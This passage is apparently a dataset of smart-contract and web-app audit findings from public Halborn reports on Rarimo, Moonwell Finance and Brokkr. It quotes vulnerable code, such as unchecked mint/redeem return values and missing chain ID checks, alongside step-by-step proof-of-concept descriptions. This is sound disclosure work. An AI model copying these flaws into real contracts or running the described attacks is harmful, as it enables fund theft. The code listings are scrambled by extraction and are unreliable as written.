eslint - plugin - node \": \"^11.1.0\" , \" eslint - plugin - prettier \": \"^4.2.1\" , \" patch - package \": \"^6.5.1\" , \" prettier \": \"^2.2.1\" , \" prettier - plugin - packagejson \": \"^2.2.18\" , \" typescript \": \"^4.7.4\" Snap package.json: 18 Listing 7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \" dependencies \": { \" @ethersproject / abi \": \"^5.0.0\" , \" @ethersproject / bytes \": \"^5.7.0\" , \" @ethersproject / keccak256 \": \"^5.7.0\" , \" @ethersproject / providers \": \"^5.7.2\" , \" @iden3 / js - crypto \": \"^1.0.0 - beta .1\" , \" @iden3 / js - iden3 - core \": \"^1.0.0 - beta .2\" , \" @iden3 / js - jsonld - merklization \": \"^1.0.0 - beta .14\" , \" @iden3 / js - jwz \": \"^1.0.0 - beta .2\" , \" @iden3 / js - merkletree \": \"^1.0.0 - beta .1\" , \" @metamask / snaps - jest \": \"^0.35.2 - flask .1\" , \" @metamask / snaps - types \": \"^0.32.2\" , \" @metamask / snaps - ui \": \"^0.32.2\" , \" buffer \": \"^6.0.3\" , \" ethers \": \"^5.7.2\" , \" intl \": \"^1.2.5\" , \" uuid \": \"^9.0.0\" }, \" devDependencies \": { \" @jest / globals \": \"^29.5.0\" , \" @lavamoat / allow - scripts \": \"^2.0.3\" , \" @metamask / auto - changelog \": \"^2.6.0\" , \" @metamask / eslint - config \": \"^10.0.0\" , \" @metamask / eslint - config - jest \": \"^10.0.0\" , \" @metamask / eslint - config - nodejs \": \"^10.0.0\" , \" @metamask / eslint - config - typescript \": \"^10.0.0\" , \" @metamask / snaps - cli \": \"^0.32.2\" , \" @types / intl \": \"^1.2.0\" , \" @types / uuid \": \"^9.0.2\" , \" @typescript - eslint / eslint - plugin \": \"^5.33.0\" , \" @typescript - eslint / parser \": \"^5.33.0\" , \" esbuild \": \"^0.17.19\" , \" eslint \": \"^8.21.0\" , \" eslint - config - prettier \": \"^8.1.0\" , \" eslint - plugin - import \": \"^2.26.0\" , \" eslint - plugin - jest \": \"^26.8.2\" , \" eslint - plugin - jsdoc \": \"^39.2.9\" , \" eslint - plugin - node \": \"^11.1.0\" , \" eslint - plugin - prettier \": \"^4.2.1\" , \" jest \": \"^29.5.0\" , \" node - stdlib - browser \": \"^1.2.0\" , \" nodemon \": \"2.0.20\" , \" prettier \": \"^2.2.1\" , 19 \" prettier - plugin - packagejson \": \"^2.2.11\" , \" rimraf \": \"^3.0.2\" , \"ts - jest \": \"^29.1.0\" , \" typescript \": \"^4.7.4\" 44 45 46 47 48 } Site package.json: Listing 8 }, \" devDependencies \": { \" @metamask / providers \": \"^9.0.0\" , \" react \": \"^18.2.0\" , \" react - dom \": \"^18.2.0\" , \" react - is \": \"^18.2.0\" , \" styled - components \": \"5.3.3\" 1 \" dependencies \": { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \" @metamask / eslint - config \": \"^10.0.0\" , \" @metamask / eslint - config - jest \": \"^10.0.0\" , \" @metamask / eslint - config - nodejs \": \"^10.0.0\" , \" @metamask / eslint - config - typescript \": \"^10.0.0\" , \" @svgr / webpack \": \"^6.4.0\" , \" @testing - library / dom \": \"^8.17.1\" , \" @testing - library / jest - dom \": \"^5.16.4\" , \" @testing - library / react \": \"^13.3.0\" , \" @testing - library / user - event \": \"^13.5.0\" , \" @types / jest \": \"^27.5.2\" , \" @types / react \": \"^18.0.15\" , \" @types / react - dom \": \"^18.0.6\" , \" @types / styled - components \": \"^5.1.25\" , \" @typescript - eslint / eslint - plugin \": \"^5.33.0\" , \" @typescript - eslint / parser \": \"^5.33.0\" , \" cross - env \": \"^7.0.3\" , \" eslint \": \"^8.21.0\" , \" eslint - config - prettier \": \"^8.1.0\" , \" eslint - plugin - import \": \"^2.26.0\" , \" eslint - plugin - jest \": \"^26.8.2\" , \" eslint - plugin - jsdoc \": \"^39.2.9\" , \" eslint - plugin - node \": \"^11.1.0\" , \" eslint - plugin - prettier \": \"^4.2.1\" , \" gatsby \": \"^4.24.4\" , \" gatsby - plugin - manifest \": \"^4.24.0\" , 20 \" gatsby - plugin - styled - components \": \"^5.24.0\" , \" gatsby - plugin - svgr \": \"^3.0.0 - beta .0\" , \" prettier \": \"^2.2.1\" , \" prettier - plugin - packagejson \": \"^2.2.18\" , \" rimraf \": \"^3.0.2\" , \" typescript \": \"^4.7.4\" 34 35 36 37 38 39 40 } Risk Level: Likelihood - 2 Impact - 2 CVSS Vector:  CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N Recommendation: Pinning dependencies to an exact version (=x.x.x) can reduce the possi- bility of inadvertently introducing a malicious version of a dependency in the future. Remediation Plan: SOLVED: All the dependencies are now pinned to exact versions. 21 ", "labels": ["Halborn", "Rarimo_Snap_App_WebApp_Pentest", "Severity: Low"]}, {"title": "RESTRICT SITES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "Metamask snap applications are protected by default by Metamask, which will control which origins can communicate with each installed snap. However, with some social engineering, an attacker could manage to con- vince a user to provide access to a malicious origin, so it can manage to call the Rarimos Snap App endpoints. This could be made impossible if the snap could only allow verified origins to communicate with it. Risk Level: Likelihood - 1 Impact - 1 Recommendation: If possible, only allow to communicate with the snap web origins that are verified and specified in a white-list. If Rarimo does not expect third-parties websites to be communicating with the snap, only the known Rarimo websites using the snap should be allowed. Remediation Plan: ACKNOWLEDGED: The Rarimo team considered that third-party websites should be able to use their snap app and therefore will not be implementing this protection. 22 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Rarimo_Snap_App_WebApp_Pentest", "Severity: Informational"]}, {"title": "SILENT FAILURE DURING TOKEN MINTING ON THE ROUTER CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The mToken.mint(msg.value); function, originating from Compounds ERC20 mToken contracts, is a call that does not revert on failure but returns an error code as a uint value instead. This behavior deviates from the standard expected of typical Solidity functions that revert on failure. This non-standard behavior makes it difficult for calling contracts (like the one above) to correctly handle failures. As the above contract does not check the return value of mToken.mint(), failures in this function will not cause the overall transaction to revert. This could lead to serious imbalances between the perceived balance of mTokens on the router contract and the actual supply of minted mTokens. Code Location: Listing 1 1 2 3 4 5 6 7 8 9 10 11 12 // / @notice Deposit ETH into the Moonwell protocol // / @param recipient The address to receive the mToken function mint ( address recipient ) external payable { weth . deposit { value : msg . value }() ; mToken . mint ( msg . value ); IERC20 ( address ( mToken )) . safeTransfer ( recipient , mToken . balanceOf ( address ( this )) ); } 23 Proof Of Concept: Step 1 : An external actor calls the mint() function, sending some ETH along with the transaction. Step 2 : The function attempts to convert the sent ETH to WETH by calling weth.deposit{value: msg.value}();. Step 3 : The contract calls mToken.mint(msg.value);, but this operation fails for some reason. However, instead of reverting the transaction, mToken.mint() returns an error code. Step 4 : Ignoring the failure from mToken.mint(), the contract proceeds to IERC20(address(mToken)).safeTransfer(recipient, mToken.balanceOf( address(this)));. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:H/D:H/Y:H/R:P/S:C (8.2) Recommendation: Ensure that mToken.mint() is successful before transferring tokens. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the return value validation. Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 24 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: High"]}, {"title": "SILENT FAILURE DURING TOKEN REDEMPTION ON THE ROUTER CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the router contract, The redeem function aims to redeem mTokens equiv- alent to mTokenRedeemAmount. The call mToken.redeem(mTokenRedeemAmount); is responsible for the redemption action. In the event of an error, the mToken.redeem() function from Compound's mToken contract does not revert, but instead returns a non-zero error code as an uint. This behavior deviates from the standard Solidity function behavior that typically reverts in case of an error. The redeem() function in the MTOKEN contract does not check the return value of mToken.redeem(mTokenRedeemAmount);. If this redemption opera- tion fails (returns a non-zero error code), the contract still proceeds with the remaining operations, leading to a silent failure. As a result, the contract behaves as if tokens were redeemed when they were not, cre- ating a discrepancy between the actual and perceived balance of mtokens and eth. Code Location: Listing 2 function redeem ( uint256 mTokenRedeemAmount , address recipient ) 1  external { 2 3 4 5 6 7 8 9 ); IERC20 ( address ( mToken )) . safeTransferFrom ( msg . sender , address ( this ) , mTokenRedeemAmount mToken . redeem ( mTokenRedeemAmount ); 25 10 11 12 13 14 15 16 } weth . withdraw ( weth . balanceOf ( address ( this ))) ; ( bool success , ) = payable ( recipient ). call { value : address ( this ). balance }( \" \" ); require ( success , \" WETHRouter : ETH transfer failed \"); Proof Of Concept: Step 1 : An external actor (say, an address A) calls the redeem() function with a certain mTokenRedeemAmount and recipient. Step 2 : The function starts by transferring mTokenRedeemAmount of This is done via the mTokens from A to the contract itself. IERC20(address(mToken)).safeTransferFrom(msg.sender, address(this), mTokenRedeemAmount); statement. Step 3 : Next, the function attempts to redeem the mTokens that have just been transferred to the contract, using mToken.redeem(mTokenRedeemAmount );. But, for some reason, this redemption fails. In normal circumstances, this failure should cause the transaction to revert. However, due to the atypical behavior of the mToken.redeem() method (it does not revert on failure but returns a non-zero uint instead), the execution continues to the next line. Step 4 : Now, the contract attempts to convert its entire WETH balance to ETH via weth.withdraw(weth.balanceOf(address(this)));. Since the re- demption in step 3 failed, this step should not result in any additional ETH being added to the contract. However, lets assume that the contract already had some ETH balance before the transaction began. Step 5 : The contract then tries to transfer its entire ETH balance to the recipient specified in step 1. Despite the failed redemption, the function ends up transferring the contracts existing ETH balance to the recipient. 26 BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:H/D:H/Y:H/R:P/S:C (8.2) Recommendation: Ensure that mToken.redeem() is successful before transferring tokens. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the return value validation. Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 27 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: High"]}, {"title": "MINT WITH PERMIT CAN BE BROKEN WHEN USING TOKENS THAT DO NOT FOLLOW THE ERC2612 STANDARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the mintWithPermit function, the implementation invokes the underlying tokens permit() function and proceeds with the assumption that the operation was successful, without verifying the outcome. However, certain tokens may not adhere to the IERC20Permit standard. For example, the DAI Stablecoin utilizes a permit() function that deviates from the reference implementation. This lack of verification may lead to inconsistencies and unexpected behavior when interacting with non-conforming tokens. Code Location: Listing 3 function mintWithPermit ( uint mintAmount , uint deadline , uint8 v , bytes32 r , bytes32 s ) override external returns ( uint ) { // Go submit our pre - approval signature data to the IERC20Permit ( underlying ). permit ( msg . sender , address ( this ) , mintAmount , deadline , v , r , s ); ( uint err ,) = mintInternal ( mintAmount ); return err ; 1 2 3 4 5 6 7  underlying token 8 9 10 11 12 13 14 15 } 28 Proof Of Concept: DAI Code Listing 4 { bytes32 digest = 1 pragma solidity =0.5.12; 2 3 contract Dai is LibNote { 4 5 6  , uint256 expiry , 7  external 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  - permit \" ); 23  ); 24 25 26 27 28 29 } )); } // --- Approve by signature --- function permit ( address holder , address spender , uint256 nonce bool allowed , uint8 v , bytes32 r , bytes32 s ) keccak256 ( abi . encodePacked ( \" \\ x19 \\ x01 \" , DOMAIN_SEPARATOR , keccak256 ( abi . encode ( PERMIT_TYPEHASH , holder , spender , nonce , expiry , allowed )) require ( holder != address (0) , \" Dai / invalid - address -0 \"); require ( holder == ecrecover ( digest , v , r , s ) , \" Dai / invalid require ( expiry == 0 || now <= expiry , \" Dai / permit - expired \" require ( nonce == nonces [ holder ]++ , \" Dai / invalid - nonce \" ); uint wad = allowed ? uint ( -1) : 0; allowance [ holder ][ spender ] = wad ; emit Approval ( holder , spender , wad ); 29 BVSS: AO:A/AC:M/AX:M/C:L/I:C/A:N/D:L/Y:L/R:N/S:C (6.7) Recommendation: Add proper verification to the permit() function call. After calling the permit() function, ensure that the operation was successful before proceeding with the minting process. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by using the safePermit function. 30 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: Medium"]}, {"title": "LACK OF END TIME VALIDATION LEADS TO WRONG MARKET INDEX CALCULATION ON THE NEW MARKETS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the _addEmissionConfig function, which is responsible for creating new market emission configurations, there is no validation check for the _endTime parameter. This oversight may lead to the creation of markets with incorrect or unreasonable end times, resulting in wrong market index calculations and potentially impacting the overall functioning of the system. Code Location: Listing 5 1 2 3 4 5 6 7 8 9 10 11 12 ... 13 14 15 16 17 18 19  at function _addEmissionConfig ( MToken _mToken , address _owner , address _emissionToken , uint _supplyEmissionPerSec , uint _borrowEmissionsPerSec , uint _endTime ) external { requireComptrollersAdmin () ; MarketConfig memory config = MarketConfig ({ // Set the owner of the reward distributor config owner : _owner , // Set the emission token address emissionToken : _emissionToken , // Set the time that the emission campaign should end 31 endTime : _endTime , 20 21 22 23  timestamp exceeds 32 bits \" ) , 24 25 26 27  timestamp exceeds 32 bits \" ) , 28 29 30 31 32 33 34 ... 35 }) ; } // Initialize the global supply supplyGlobalTimestamp : safe32 ( block . timestamp , \" block supplyGlobalIndex : initialIndexConstant , // Initialize the global borrow index + timestamp borrowGlobalTimestamp : safe32 ( block . timestamp , \" block borrowGlobalIndex : initialIndexConstant , // Set supply and reward borrow speeds supplyEmissionsPerSec : _supplyEmissionPerSec , borrowEmissionsPerSec : _borrowEmissionsPerSec Proof Of Concept: Listing 6 MultiRewardDistributor distributorHarness = new function createDistributorWithRoundValuesAndConfig ( uint faucetToken . allocateTo ( address ( this ) , tokensToMint ); faucetToken . approve ( address ( mToken ) , tokensToMint ); 1  tokensToMint , uint supplyEmissionsPerSecond , uint  borrowEmissionsPerSecond ) internal returns ( MultiRewardDistributor  distributor ) { 2 3 4 5  MultiRewardDistributor ( 6 7 8 9 10 11 12 13  e18 ); 14 // Add config + send emission tokens emissionToken . allocateTo ( address ( distributorHarness ) , 100 // 1 year of rewards uint endTime = block . timestamp - (60 * 60 * 24 * 365) ; distributorHarness . _addEmissionConfig ( address ( comptroller ) , address ( this ) ); 32 15 16 17 18 19 20 21 22 23 24 mToken , address ( this ) , address ( emissionToken ) , supplyEmissionsPerSecond , borrowEmissionsPerSecond , endTime ); return distributorHarness ; } BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:L/D:H/Y:H/R:P/S:U (6.2) Recommendation: To address this issue, consider adding a validation check within the _addEmissionConfig function to ensure that the _endTime parameter is valid and reasonable. The check should verify that _endTime is greater than the current block timestamp. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the _endTime validation. 33 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: Medium"]}, {"title": "MISSING CHAIN ID AND RECEIVER ADDRESS VERIFICATION IN EXECUTEPROPOSAL(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The executeProposal() function in the current smart contract is responsi- ble for parsing and verifying VAAs (Validators Aggregated Attestations) and then executing transactions based on these VAAs. The function does not verify the Chain ID or the receiver address (recipient of the trans- action). The absence of chain ID and receiver address verification could lead to significant security issues. Since the chain ID and recipient address are not checked, an attacker can craft a VAA to target an address on another chain, causing a cross-chain replay attack. Code Location: Listing 7 function _executeProposal ( bytes memory VAA , bool overrideDelay ) // This call accepts single VAAs and headless VAAs ( IWormhole . VM memory vm , bool valid , string memory reason ) = wormholeBridge . parseAndVerifyVM ( VAA ); require ( valid , reason ); // / ensure VAA parsing 1  private { 2 3 4 5 6 7 8 9  verification succeeded 10 11 12 13 require ( if (! overrideDelay ) { queuedTransactions [ vm . hash ]. queueTime != 0 , 34 \" TemporalGovernor : tx not queued \" queuedTransactions [ vm . hash ]. queueTime + block . timestamp , \" TemporalGovernor : timelock not finished \" } else if ( queuedTransactions [ vm . hash ]. queueTime == 0) { // / if queue time is 0 due to fast track execution , queuedTransactions [ vm . hash ]. queueTime = block . } ); ); require ( ); require ( 14 15 16 17  proposalDelay <= 18 19 20 21 22  set it to current block timestamp 23  timestamp . toUint248 () ; 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  revert with the error bubbling up 53 // / Interaction ( s ) ); ! queuedTransactions [ vm . hash ]. executed , \" TemporalGovernor : tx already executed \" queuedTransactions [ vm . hash ]. executed = true ; address [] memory targets ; // / contracts to call uint256 [] memory values ; // / native token amount to send bytes [] memory calldatas ; // / calldata to send (, targets , values , calldatas ) = abi . decode ( vm . payload , ( address , address [] , uint256 [] , bytes []) _sanityCheckPayload ( targets , values , calldatas ); for ( uint256 i = 0; i < targets . length ; i ++) { address target = targets [ i ]; uint256 value = values [ i ]; bytes memory data = calldatas [ i ]; // Go make our call , and if it is not successful ( bool success , bytes memory returnData ) = target . call { 35 data );  value : value }( 54 55 56 57 58 59 60 61 62 } } // / revert on failure with error message if any require ( success , string ( returnData )); emit ExecutedTransaction ( target , value , data ); Proof Of Concept: Step 1 : An attacker crafts a wormhole message that appears to be valid but is intended for a different chain (different chain ID) or is directed to an unintended recipient address. Step 2 : The attacker submits this crafted payload to the _executeProposal () function in the smart contract. Step 3 : Since there are no checks in place for the chain ID or recipient address, the function treats the VAA as valid and begins to execute the transaction(s) specified in the VAA payload. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:H/D:N/Y:N/R:P/S:C (5.9) Recommendation: Consider checking emitter Chain id, receiver on the function. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the necessary validations. 36 Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 37 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: Medium"]}, {"title": "WRONG EVENT IS EMITTED IN THE UPDATE BORROW SPEED FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The _updateBorrowSpeed function in the smart contract is responsible for updating the borrow emission speed for the specified MToken and However, it has been identified that the wrong event emissionToken. is being emitted at the end of the function. The current implemen- tation emits the NewSupplyRewardSpeed event instead of the expected NewBorrowRewardSpeed event. This discrepancy can lead to confusion and incorrect data being captured by event listeners, potentially impacting the systems overall efficiency, accuracy, and traceability. Code Location: Listing 8 // / @notice Update the borrow emissions for a given mtoken , function _updateBorrowSpeed ( MToken _mToken , address MarketEmissionConfig storage emissionConfig = 1  emission token pair . 2  _emissionToken , uint _newBorrowSpeed ) public { 3  fetchConfigByEmissionToken ( _mToken , _emissionToken ); 4 5 6 7 8  borrowEmissionsPerSec ; 9 10  new borrow emissions to be equal to current !\" ); 11  borrow reward speed higher than the emission cap ! \"); // Safety check this is the owner or the admin requireEmissionConfigOwnerOrAdmin ( emissionConfig ); uint currentBorrowSpeed = emissionConfig . config . require ( _newBorrowSpeed < emissionCap , \" Cannot set a require ( _newBorrowSpeed != currentBorrowSpeed , \" Can 't set 38 // Make sure we update our indices before setting the new updateMarketBorrowIndexInternal ( _mToken ); // Update borrow speed emissionConfig . config . borrowEmissionsPerSec = 12 13  speed 14 15 16 17  _newBorrowSpeed ; 18 19  currentBorrowSpeed , _newBorrowSpeed ); 20 } emit NewSupplyRewardSpeed ( _mToken , _emissionToken , BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:L/D:N/Y:N/R:P/S:U (3.4) Recommendation: To address this issue, It is recommended to update the _updateBorrowSpeed function to emit the correct event, NewBorrowRewardSpeed, instead of the current NewSupplyRewardSpeed event. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by changing the event. 39 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: Low"]}, {"title": "EMISSIONCAP LACKS AN UPPER BOUND, LEADING TO POTENTIAL OVERFLOWS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The emissionCap variable in the given smart contract does not have an upper bound in the _setEmissionCap function. By default, the emission cap is set to 100 * 10^18 tokens per second to avoid unbounded compu- tation/multiplication overflows. However, the function _setEmissionCap allows changing the emissionCap value without any restriction on the up- per limit, which can potentially lead to overflows and other unexpected issues in the contracts execution. Code Location: Listing 9 function _setEmissionCap ( uint _newEmissionCap ) external { requireComptrollersAdmin () ; uint oldEmissionCap = emissionCap ; emissionCap = _newEmissionCap ; emit NewEmissionCap ( oldEmissionCap , _newEmissionCap ); } 1 2 3 4 5 6 7 8 9 BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:L/D:N/Y:N/R:P/S:U (3.4) 40 Recommendation: To address this issue, consider implementing an upper bound for the emissionCap. Modify the _setEmissionCap function to include an additional require statement that checks if the new value for the emission cap is within a predefined safe range. Remediation Plan: RISK ACCEPTED: The Moonwell Finance team accepted the risk of this issue. 41 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: Low"]}, {"title": "UNRESTRICTED RECEIVE IN WETHROUTER ENABLES EXCESS REDEMPTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The redeem() function in the current design of the WETHRouter smart contract is designed to handle the redemption of mToken and subsequent withdrawal of WETH. However, this function does not restrict the receipt of tokens to only WETH/mToken. As a result, any native token sent directly to the WETHRouter contract will be sent to the first redeemer. In this setup, an unintentional or malicious transfer of arbitrary tokens to the WETHRouter contract could lead to an unexpected balance increase. When the redeem() function is called, it attempts to withdraw all ETH equivalent in the contract and sends it to the recipient. If an arbitrary amount of tokens or native ETH is sent to the contract, it would inflate the balance available for withdrawal, making it retrievable by the first redeemer. Code Location: Listing 10 function redeem ( uint256 mTokenRedeemAmount , address recipient ) 1  external { 2 3 4 5 6 7 8 9 10 11 12 13 ); IERC20 ( address ( mToken )) . safeTransferFrom ( msg . sender , address ( this ) , mTokenRedeemAmount mToken . redeem (100 ether ); weth . withdraw ( weth . balanceOf ( address ( this ))) ; ( bool success , ) = payable ( recipient ). call { value : address ( this ). balance 42 }( \" \" ); require ( success , \" WETHRouter : ETH transfer failed \"); } receive () external payable {} 14 15 16 17 18 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:N/R:P/S:C (3.1) Recommendation: A potential solution could be to add a mechanism that isolates the withdrawal of mToken-generated WETH from the withdrawal of other tokens that might be sent to the contract. This could be achieved by storing the contracts balance before and after the mToken redemption and only allowing the withdrawal of the difference. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding an address validation. 43 ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: Low"]}, {"title": "IMPLEMENTATIONS CAN BE INITIALIZED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The contracts are upgradable, inheriting from the Initializable contract. However, the current implementations are missing the _disableInitializers () function call in the constructors. Thus, an attacker can initialize the implementation. Usually, the initialized implementation has no direct impact on the proxy itself; however, it can be exploited in a phishing attack. In rare cases, the implementation might be mutable and may have an impact on the proxy. BVSS: AO:A/AC:L/AX:M/C:N/I:L/A:N/D:L/Y:L/R:N/S:U (2.5) Recommendation: It is recommended to call _disableInitializers within the contracts constructor to prevent the implementation from being initialized. Remediation Plan: SOLVED: The contracts now implement the _disableInitializers() function call in the constructors. Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 44 4.10 (HAL-10) HARD-CODED MTOKEN ADDRESS IN WETHUNWRAPPER CONTRACT - LOW (2.5) ", "labels": ["Halborn", "Moonwell_Finance_Contracts_V2", "Severity: Informational"]}, {"title": "LACK OF ADDRESS NORMALIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Long_Term_Bonding_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The multiple features of the bonding-v1 and staking-v1 contracts do not consider that Terra addresses are valid both upper and all lower case. Although valid, a strict comparison between the same address in its all uppercase version (e.g.: TERRA1KG. . . XNL8) and its all lowercase version (e.g.: terra1kg. . . xnl8) failure. The likelihood of this issue was reduced as the affected functions were owner-only functionalities, therefore much less prone to error, or queries. Queries affected by this issue will only cause inconvenience rather than a security issue. Undesired situations could occur, such as loss of control over the de- pendent contract addresses in case of instantiation with a misvalidated address made up of capital letters. Since update_config does not provide an option for changing some addresses of the contracts, the administrator will lose access to contract management. Code Location: Listing 1: contracts/staking-v1/src/contract.rs (Lines 60,61,62,63) deps : DepsMut , env : Env , _info : MessageInfo , msg : InstantiateMsg , 43 pub fn instantiate ( 44 45 46 47 48 ) -> Result < Response , ContractError > { 49  CONTRACT_VERSION ) ?; 50 51  community_bonding_contract { 52 let community_bonding_contract = if let Some ( addr ) = msg . Some ( deps . api . addr_canonicalize (& addr ) ?) set_contract_version ( deps . storage , CONTRACT_NAME , 11 }; } else { None let config = Config { 53 54 55 56 57 58 59 60 61  rewards_pool_contract )? , 62  bbro_minter_contract )? , 63  epoch_manager_contract )? , 64 65 66 67 68  , 69  , 70 71 72 73 74 }, }; owner : deps . api . addr_canonicalize (& msg . owner )? , paused : false , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . bbro_minter_contract : deps . api . addr_canonicalize (& msg . epoch_manager_contract : deps . api . addr_canonicalize (& msg . community_bonding_contract , unstake_period_blocks : msg . unstake_period_blocks , min_staking_amount : msg . min_staking_amount , lockup_config : LockupConfig { min_lockup_period_epochs : msg . min_lockup_period_epochs max_lockup_period_epochs : msg . max_lockup_period_epochs base_rate : msg . base_rate , linear_growth : msg . linear_growth , exponential_growth : msg . exponential_growth , The update_config function from staking-v1/src/commands.rs does not pro- vide the possibility of changing the above contract addresses. The only address that can be updated is community_bonding_contract: Listing 2: contracts/staking-v1/src/commands.rs (Line 575) 565 pub fn update_config ( 566 567 568 569 570 571 572 573 deps : DepsMut , paused : Option < bool >, unstake_period_blocks : Option < u64 >, min_staking_amount : Option < Uint128 >, min_lockup_period_epochs : Option < u64 >, max_lockup_period_epochs : Option < u64 >, base_rate : Option < Decimal >, linear_growth : Option < Decimal >, 12 574 575 576 ) -> Result < Response , ContractError > exponential_growth : Option < Decimal >, community_bonding_contract : Option < String >, The above-mentioned lack of normalization was also noted in the following lines of the contracts: Listing 3: Affected resources 1 contracts / bonding - v1 / src / commands . rs : #346 , 354 , 362 , 370 , 445 ,  477 Risk Level: Likelihood - 1 Impact - 3 Recommendation: One of the two approaches detailed below should be used:  Update the cosmwasm-vm and use cosmwasm_std::Api::addr_validate (reference CWA-2022-002).  If the update mentioned is not possible, addresses could be stored in canonical format by using the cosmwasm_std::Api::addr_canonicalize utility function. The following considerations should be considered when implementing the second option:  To successfully compare a canonical address, both ends should be in canonical format. For example, when performing access controls, the sender (e.g.: info.sender or env.message.sender) should be canoni- calized beforehand too. 13  To send funds to a canonicalized address or include them into a message to a different contract, they should be first turn into its human-readable format via the cosmwasm_std::Api::addr_humanize utility function Remediation plan: RISK ACCEPTED: The Brokkr team decided not to take action on this finding because the affected functionalities were only available to the contract owner. 14 ", "labels": ["Halborn", "Brokkr_Protocol_Long_Term_Bonding_CosmWasm", "Severity: Low"]}, {"title": "UNMANTAINED DEPENDENCY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Long_Term_Bonding_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Halborn used automated security scanners to assist with detection of well-known security issues and vulnerabilities. Among the tools used was cargo audit, a security scanner for vulnerabilities reported to the RustSec Advisory Database. All vulnerabilities published in https:// crates.io are stored in a repository named The RustSec Advisory Database. cargo audit is a human-readable version of the advisory database which performs a scanning on Cargo.lock. Security Detections are only in scope. To better assist the developers maintaining this code, the auditors are including the output with the dependencies tree, and this is included in the cargo audit output to better know the dependencies affected by unmaintained and vulnerable crates. ID RUSTSEC-2020-0025 package bigint Short Description biginit is unmaintained, use uint instead Code Location: Listing 4: Dependency tree 1 bigint 4.4.3 2 3 4 cosmwasm - bignumber 2.2.0 brotocol - staking - v1 1.1.0 brotocol - oracle 1.0.0 Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: Beware of using dependencies and packages that are no longer supported by the developers or have publicly known security flaws, even when not exploitable at the moment. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 16 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Brokkr_Protocol_Long_Term_Bonding_CosmWasm", "Severity: Informational"]}, {"title": "CONFIDENTIAL 